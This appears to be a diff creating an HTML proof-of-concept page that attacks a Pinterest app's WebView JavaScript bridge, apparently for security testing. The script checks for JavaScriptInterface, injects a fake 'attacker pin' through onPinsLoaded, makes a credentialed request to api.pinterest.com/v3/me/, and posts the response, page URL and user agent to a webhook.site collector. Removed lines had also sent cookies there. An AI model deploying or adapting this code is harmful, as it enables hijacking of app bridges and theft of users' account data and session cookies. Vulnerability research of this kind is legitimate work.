@@ -1,14 +1,57 @@
-    log("[4] API response (" + data.length + " bytes): " + data.substring(0, 200));
-    cb("api-data", data);
-})
-.catch(function(e) {
-    log("[4] fetch error (CORS blocked read — but request was sent with cookies): " + e);
-    cb("cors-error", String(e) + " | cookies sent to api.pinterest.com regardless");
-});
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PT-M3 Test</title>
+<style>
+body{font-family:monospace;font-size:14px;padding:20px;background:#fff;}
+#s{font-size:18px;font-weight:bold;margin-bottom:12px;}
+#d{white-space:pre-wrap;background:#f0f0f0;padding:10px;margin-top:10px;}
+</style>
+</head>
+<body>
+<div id="s">Checking...</div>
+<img src="https://picsum.photos/id/10/640/480" width="320" height="240" alt="img1">
+<img src="https://picsum.photos/id/11/640/480" width="320" height="240" alt="img2">
+<pre id="d"></pre>
+<script>
+var WH="https://webhook.site/a4650d9c-8cfb-45cb-826c-02209dd79a8a";
+function log(m){document.getElementById("d").textContent+=m+"\n";}
+function cb(p,b){fetch(WH+"/"+p,{method:"POST",headers:{"Content-Type":"text/plain"},body:String(b)}).catch(function(){});}
 
-// Step 5 — log document.cookie for this origin
-log("[5] document.cookie (this origin): [" + document.cookie + "]");
-cb("origin-cookies", "cookies=" + document.cookie);
+log("[1] JS executed at: "+window.location.href);
+cb("js-ran","href="+window.location.href+"|UA="+navigator.userAgent);
+
+if(typeof window.JavaScriptInterface!=="undefined"){
+  document.body.style.background="red";
+  document.getElementById("s").textContent="EXPLOIT ACTIVE - JavaScriptInterface FOUND";
+  log("[2] JavaScriptInterface FOUND");
+  cb("jsi-found","present at "+window.location.href);
+  try{
+    window.JavaScriptInterface.onPinsLoaded(JSON.stringify({
+      thumb:[{url:"https://picsum.photos/id/20/640/480",x:0,y:0,width:640,height:480}],
+      meta:{url:"https://attacker-controlled.example.com",title:"PT-M3 ATTACKER PIN"}
+    }));
+    log("[3] onPinsLoaded() called");
+    cb("on-pins-loaded","success");
+  }catch(e){
+    log("[3] onPinsLoaded error: "+e);
+    cb("on-pins-loaded-error",String(e));
+  }
+}else{
+  document.body.style.background="yellow";
+  document.getElementById("s").textContent="JS ran - no JavaScriptInterface";
+  log("[2] JavaScriptInterface NOT found");
+  cb("jsi-missing","no JSI at "+window.location.href);
+}
+
+log("[4] Fetching api.pinterest.com with credentials...");
+fetch("https://api.pinterest.com/v3/me/",{credentials:"include",mode:"cors"})
+.then(function(r){log("[4] status: "+r.status);cb("api-status","HTTP "+r.status);return r.text();})
+.then(function(d){log("[4] data: "+d.substring(0,200));cb("api-data",d);})
+.catch(function(e){log("[4] fetch error: "+e);cb("cors-error",String(e));});
+
+log("[5] cookies this origin: ["+document.cookie+"]");
 </script>
 </body>
 </html>
